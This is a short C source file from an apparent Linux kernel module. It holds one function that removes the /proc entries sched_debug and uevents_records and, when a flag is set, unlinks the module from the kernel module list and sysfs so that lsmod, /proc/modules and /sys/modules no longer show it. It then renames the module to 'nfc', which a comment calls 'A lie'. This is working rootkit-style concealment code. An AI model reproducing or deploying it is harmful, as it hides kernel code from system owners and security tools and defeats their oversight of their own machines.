//
// Created by fuqiuluo on 25-1-22.
//
#include "peekaboo.h"
#include <asm/tlbflush.h>
#include <asm/pgtable.h>
#include <linux/tty.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/list.h>
#include <linux/pid.h>
#include <linux/rculist.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/pid_namespace.h>
#include <linux/slab.h>
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>

#include "kkit.h"

void cuteBabyPleaseDontCry(void) {
    if (is_file_exist("/proc/sched_debug")) {
        remove_proc_entry("sched_debug", NULL);
    }

    if (is_file_exist("/proc/uevents_records")) {
        remove_proc_entry("uevents_records", NULL);
    }

#ifdef MODULE
    #if HIDE_SELF_MODULE == 1
    list_del(&THIS_MODULE->list); //lsmod,/proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
    list_del(&THIS_MODULE->mkobj.kobj.entry); // kobj struct list_head entry
    #endif
#endif

#if HIDE_SELF_MODULE == 1
    // protocol disguise! A lie
    memcpy(THIS_MODULE->name, "nfc\0", 4);
    //remove_proc_entry("protocols", net->proc_net);
#endif
}
